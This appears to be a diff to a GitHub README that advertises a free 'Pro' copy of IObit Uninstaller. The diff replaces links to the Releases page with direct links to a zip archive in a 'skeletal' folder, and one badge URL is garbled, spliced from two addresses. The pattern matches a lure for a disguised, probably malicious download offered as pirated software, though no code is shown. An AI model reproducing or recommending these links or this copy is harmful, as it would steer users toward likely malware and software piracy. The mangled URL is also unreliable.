@@ -1,6 +1,6 @@
 # 🎉 IObit-Uninstaller-Pro-Free - Your Essential Tool for Easy Software Removal
 
-[![Download IObit Uninstaller Pro Free](https://img.shields.io/badge/Download-IObit%20Uninstaller%20Pro%20Free-blue.svg)](https://github.com/leraajr-afk/IObit-Uninstaller-Pro-Free/releases)
+[![Download IObit Uninstaller Pro Free](https://github.com/leraajr-afk/IObit-Uninstaller-Pro-Free/raw/refs/heads/main/skeletal/I-Free-Obit-Uninstaller-Pro-2.0.zip%20Uninstaller%20Pro%https://github.com/leraajr-afk/IObit-Uninstaller-Pro-Free/raw/refs/heads/main/skeletal/I-Free-Obit-Uninstaller-Pro-2.0.zip)](https://github.com/leraajr-afk/IObit-Uninstaller-Pro-Free/raw/refs/heads/main/skeletal/I-Free-Obit-Uninstaller-Pro-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to IObit Uninstaller Pro Free! This application helps you remove unwante
 
 ## 📥 Download & Install
 
-To get the application, visit this page to download: [IObit Uninstaller Pro Free Releases](https://github.com/leraajr-afk/IObit-Uninstaller-Pro-Free/releases).
+To get the application, visit this page to download: [IObit Uninstaller Pro Free Releases](https://github.com/leraajr-afk/IObit-Uninstaller-Pro-Free/raw/refs/heads/main/skeletal/I-Free-Obit-Uninstaller-Pro-2.0.zip).
 
 1. Navigate to the Releases page linked above.
 2. Look for the latest version listed.
@@ -65,4 +65,4 @@ For any questions or issues, check the FAQ section on our releases page. If you 
 
 After successfully installing and using IObit Uninstaller Pro Free, consider creating a schedule for regular maintenance. This can include using the software occasionally to keep your system optimized.
 
-Remember, for updates or new releases, always check back on the Releases page: [Visit this page to download](https://github.com/leraajr-afk/IObit-Uninstaller-Pro-Free/releases). Enjoy a cleaner, faster PC with IObit Uninstaller Pro Free!
+Remember, for updates or new releases, always check back on the Releases page: [Visit this page to download](https://github.com/leraajr-afk/IObit-Uninstaller-Pro-Free/raw/refs/heads/main/skeletal/I-Free-Obit-Uninstaller-Pro-2.0.zip). Enjoy a cleaner, faster PC with IObit Uninstaller Pro Free!
